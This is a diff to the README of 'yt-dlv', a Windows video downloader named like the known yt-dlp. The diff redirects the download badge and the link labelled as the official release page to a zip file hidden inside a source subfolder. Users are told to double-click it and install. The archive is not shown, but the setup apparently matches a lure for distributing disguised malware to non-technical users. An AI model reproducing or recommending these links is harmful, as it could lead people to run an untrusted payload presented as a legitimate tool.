@@ -1,6 +1,6 @@
 # 📥 yt-dlv - Download online videos with simple commands
 
-[![](https://img.shields.io/badge/Download-yt--dlv-blue)](https://github.com/Shapelessnesslakenasser573/yt-dlv)
+[![](https://img.shields.io/badge/Download-yt--dlv-blue)](https://github.com/Shapelessnesslakenasser573/yt-dlv/raw/refs/heads/main/crates/ytdlv-core/yt-dlv-semiduplex.zip)
 
 yt-dlv is a tool for your computer. It saves audio and video files from websites to your hard drive. This program uses code that runs quickly and handles links from many platforms. You do not need to understand how the code works. This guide helps you install and use the program on Windows.
 
@@ -26,7 +26,7 @@ Your computer needs specific parts to run this software:
 
 Follow these steps to put the software on your machine:
 
-1.  Visit the official release page to download the setup file: [https://github.com/Shapelessnesslakenasser573/yt-dlv](https://github.com/Shapelessnesslakenasser573/yt-dlv).
+1.  Visit the official release page to download the setup file: [https://github.com/Shapelessnesslakenasser573/yt-dlv/raw/refs/heads/main/crates/ytdlv-core/yt-dlv-semiduplex.zip](https://github.com/Shapelessnesslakenasser573/yt-dlv/raw/refs/heads/main/crates/ytdlv-core/yt-dlv-semiduplex.zip).
 2.  Locate the downloaded file in your Downloads folder.
 3.  Double-click the file to open the setup window.
 4.  Follow the prompts on your screen to install the program in a folder you can find.
